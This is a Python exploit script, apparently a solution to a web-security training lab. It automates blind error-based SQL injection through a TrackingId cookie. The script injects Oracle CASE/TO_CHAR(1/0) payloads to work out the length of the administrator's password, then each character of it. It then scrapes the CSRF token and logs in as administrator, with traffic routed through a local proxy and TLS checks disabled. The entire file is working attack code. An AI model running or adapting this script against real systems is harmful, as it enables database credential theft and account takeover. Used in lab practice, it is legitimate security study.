import requests
import sys
import urllib3
import string
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


def cookies_extract(url):
    
    r = requests.get(url, verify=False, proxies=proxies)
    
    if r.status_code !=200:
        print("(-) Error: Response code not 200")
        print("(-) Couldn't extract TrackingId....")
        print("Terminating program...!!!")
        sys.exit(-1)
    
    return r.cookies.get_dict() #Cookies extraction


def length_calc(url):
    
    num = 1
    loop = True
    cookies_received = cookies_extract(url)
    init_Tracking_id = cookies_received["TrackingId"] #To reset the payload
    print(f"(+) TrackingId cookies = {cookies_received['TrackingId']}")
    
    print("(+) Calculating length of password...")

    while loop: #Setting loop to find the length of password
        
        payload = cookies_received["TrackingId"] + f"' || (SELECT CASE WHEN LENGTH(password)>{num} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '" #Checking the length of password
        cookies_received["TrackingId"] = payload    #Injecting payload from unsanitized cookies parameter
        
        response = requests.get(url, verify=False, proxies=proxies, cookies=cookies_received)
        cookies_received["TrackingId"] = init_Tracking_id #Re-initialising the TrackingId cookies


        if response.status_code != 200:
            num += 1
        else:
            print(f"Length of passowrd is {num}")
            loop = False

    return num


def injection(url):

    password = ""

    password_length = length_calc(url)

    cookies_received = cookies_extract(url)
    init_Tracking_id = cookies_received["TrackingId"] #To reset the payload

    char_set = string.ascii_lowercase + string.digits

    print("(+) Calculating the password...")
    
    #Loop for password calculation
    for num in range(password_length):
        for char in char_set:

            payload = cookies_received["TrackingId"] + f"' || (SELECT CASE WHEN SUBSTR(password,{num+1},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '" #Checking each and every alphanumeric character for every character of passowrd
            cookies_received["TrackingId"] = payload    #Injecting payload
        
            response = requests.get(url, verify=False, proxies=proxies, cookies=cookies_received)
            cookies_received["TrackingId"] = init_Tracking_id #Re-initialising the TrackingId cookies

            if response.status_code != 200:
                password += char
                break


    print(f"The password extracted: {password}")
    return password



def login_admin(url, password):

    print("(+) Proceeding to login as administrator...")

    login_url = url + "/login"

    session = requests.Session()

    session.proxies = proxies # Use Burp proxy

    session.verify = False  # Ignore SSL warning

    response = session.get(login_url)

    soup = BeautifulSoup(response.text, 'html.parser')

    csrf = soup.find("input", {"name": "csrf"})

    token = csrf["value"]

    print(f"(+) CSRF token = {token}")

    data = {
        "csrf": token,
        "username": "administrator",
        "password": password
    }

    # POST request with same session as previous
    login_response = session.post(login_url, data=data)

    if "Log out" in login_response.text:
        print("(+) Login successful!")
    else:
        print("(-) Login failed!")
        print(f"(-) Status code: {login_response.status_code}")




def main():
    if len(sys.argv) != 2:
        print("(+)Usage: %s <url>: " % sys.argv[0])
        print("(+)Example: %s www.example.com: " % sys.argv[0])
        sys.exit()
    
    url = sys.argv[1]
    password = injection(url)
    

    login_admin(url, password)




if __name__ == '__main__':
    main()